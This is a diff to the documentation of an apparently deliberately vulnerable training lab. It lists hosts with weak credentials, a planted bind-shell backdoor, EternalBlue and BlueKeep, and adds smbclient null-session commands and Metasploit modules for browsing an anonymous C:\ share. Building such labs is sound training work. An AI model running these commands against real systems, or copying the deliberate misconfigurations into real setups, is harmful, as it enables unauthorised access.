@@ -66,7 +66,7 @@ VM IPs are what you scan. The loot refers to the boxes by the hostnames
 |             | RDP (xrdp)     | 3389/tcp  | `ubuntu` / `ubuntu`     | weak RDP creds                         |
 |             | VNC (x11vnc)   | 5900/tcp  | `password`              | weak VNC password                      |
 |             | bind shell     | 65534/tcp | none                    | **planted backdoor** -> bash as jsmith |
-| **desk02**  | SMB (Win7)     | 445/tcp   | no auth                 | **CVE-2017-0144** MS17-010 EternalBlue |
+| **desk02**  | SMB (Win7)     | 445/tcp   | no auth, anon `C` share | **CVE-2017-0144** MS17-010 EternalBlue |
 |             | RDP            | 3389/tcp  | `Docker`/`admin`        | **CVE-2019-0708** BlueKeep, NLA off    |
 |             | web console    | 8006/tcp  | browser viewer          | dockur install/login console           |
 
@@ -547,6 +547,14 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   #      use exploit/windows/smb/ms17_010_psexec      (needs creds — lab_backdoor/Passw0rd!)
   ```
   Eval media, never patched, SMBv1 on — EternalBlue works out of the box.
+- Anonymous C:\ share (null session — share ACL + NullSessionShares +
+  EveryoneIncludesAnonymous all deliberately wrong):
+  ```bash
+  smbclient -N -L //<desk02-ip>        # list shares as anonymous
+  smbclient -N //<desk02-ip>/C         # browse C:\ with no credentials
+  # msf: use auxiliary/scanner/smb/smb_enumshares
+  #      use auxiliary/scanner/smb/smb_enumusers
+  ```
 - RDP / BlueKeep (port 3389, NLA deliberately off):
   ```bash
   nmap -p3389 --script rdp-vuln-* <desk02-ip>
